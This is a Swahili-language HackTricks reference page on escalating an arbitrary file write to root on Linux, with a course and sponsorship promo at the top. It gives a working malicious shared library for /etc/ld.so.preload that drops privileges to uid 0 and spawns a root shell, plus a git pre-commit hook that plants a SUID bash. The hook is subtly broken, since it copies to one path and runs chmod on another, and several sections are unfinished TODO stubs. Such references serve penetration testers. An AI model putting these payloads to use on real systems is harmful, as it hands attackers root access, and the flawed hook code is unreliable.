# Kuandika Faili ya Kiholela kwa Root

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

### /etc/ld.so.preload

Faili hii inajitokeza kama **`LD_PRELOAD`** mazingira ya env lakini pia inafanya kazi kwenye **binari za SUID**.\
Ikiwa unaweza kuunda au kuhariri, unaweza tu kuongeza **njia ya maktaba itakayopakiwa** na kila binari inayotekelezwa.

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Kanzu za Git

[Kanzu za Git](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **maandishi** ambayo hutekelezwa katika matukio mbalimbali katika hazina ya git kama vile wakati wa kufanya commit, kufanya merge... Kwa hivyo, ikiwa **script au mtumiaji mwenye mamlaka** anafanya vitendo hivi mara kwa mara na ni rahisi **kuandika katika folda ya `.git`**, hii inaweza kutumika kwa **privesc**.

Kwa mfano, Inawezekana **kuunda script** katika hazina ya git katika **`.git/hooks`** ili iweze kutekelezwa daima wakati commit mpya inapotengenezwa:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Faili za Cron & Wakati

TODO

### Faili za Huduma & Soketi

TODO

### binfmt\_misc

Faili iliyoko katika `/proc/sys/fs/binfmt_misc` inaonyesha ni binary gani inapaswa kutekeleza aina gani ya faili. TODO: angalia mahitaji ya kutumia hii kutekeleza rev shell wakati aina ya kawaida ya faili inafunguliwa.
